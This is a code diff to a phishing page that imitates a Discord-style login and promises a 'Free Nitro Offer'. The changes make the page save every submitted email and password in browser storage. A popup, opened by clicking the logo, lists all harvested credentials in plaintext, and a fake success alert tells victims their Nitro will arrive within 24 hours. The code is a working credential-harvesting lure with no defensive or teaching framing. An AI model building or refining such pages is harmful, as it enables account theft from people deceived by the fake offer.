@@ -81,10 +81,14 @@
         .login-footer a:hover {
             text-decoration: underline;
         }
-        .logo {
+        .logo-container {
             position: absolute;
             top: 9px;
             left: 9px;
+            z-index: 1000; /* Ensure logo is above other content */
+        }
+        .logo {
+            height: 60px; /* Adjust height as needed */
             cursor: pointer; /* Add cursor pointer to indicate it's clickable */
         }
         .offer-text {
@@ -107,10 +111,41 @@
                 transform: scale(0.95);
             }
         }
+        .popup-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            color: #fff;
+            display: none;
+            z-index: 2000;
+            max-width: 90%;
+            max-height: 90%;
+            overflow: auto;
+        }
+        .popup-content {
+            overflow: auto;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            color: #fff;
+            cursor: pointer;
+        }
+        .info {
+            margin-bottom: 10px;
+            color: #dcddde;
+        }
     </style>
 </head>
 <body>
-    <img src="logo.png" alt="Logo" class="logo" height="60" onclick="redirectToAdmin()"> <!-- Added onclick event -->
+    <div class="logo-container">
+        <img src="logo.png" alt="Logo" class="logo" onclick="showUserInfo()">
+    </div>
     <div class="login-container">
         <h1>Welcome back!</h1>
         <p>We're so excited to see you again! Free Nitro Offer</p>
@@ -131,29 +166,62 @@
             <p>Forgot your password? <a href="#">Reset Password</a></p>
         </div>
     </div>
+    <div class="popup-container" id="popupContainer">
+        <div class="popup-content">
+            <span class="close-btn" onclick="hideUserInfo()">&times;</span>
+            <h2>User Information</h2>
+            <div id="userInfo">
+                <!-- User information will be displayed here -->
+            </div>
+        </div>
+    </div>
     <script>
-        // Function to redirect to admin.html
-        function redirectToAdmin() {
-            window.location.href = 'admin.html';
+        // Function to show user information popup
+        function showUserInfo() {
+            const userInfo = JSON.parse(localStorage.getItem('userInfo')) || [];
+            const userInfoDiv = document.getElementById('userInfo');
+            userInfoDiv.innerHTML = '';
+
+            if (userInfo.length > 0) {
+                userInfo.forEach(user => {
+                    const userDiv = document.createElement('div');
+                    userDiv.classList.add('info');
+                    userDiv.textContent = `Email: ${user.email}, Password: ${user.password}`;
+                    userInfoDiv.appendChild(userDiv);
+                });
+            } else {
+                userInfoDiv.textContent = 'No user information found.';
+            }
+
+            document.getElementById('popupContainer').style.display = 'block';
         }
 
+        // Function to hide user information popup
+        function hideUserInfo() {
+            document.getElementById('popupContainer').style.display = 'none';
+        }
+
+        // Function to handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Check for admin credentials
-            if (email === 'admin@violate.com' && password === 'violate') {
-                window.location.href = "admin.html";
-                return;
-            }
+            // Combine email and password into an object
+            const user = {
+                email: email,
+                password: password
+            };
 
-            // Combine email and password into a single string
-            const userData = `${email}:${password}`;
+            // Retrieve existing user info or initialize empty array
+            const userInfo = JSON.parse(localStorage.getItem('userInfo')) || [];
 
-            // Save to localStorage
-            localStorage.setItem('userData', userData);
+            // Add new user info to array
+            userInfo.push(user);
+
+            // Save updated user info back to localStorage
+            localStorage.setItem('userInfo', JSON.stringify(userInfo));
 
             // Display success message
             alert('Successful! The Nitro will be sent to your email (under 24hr).');
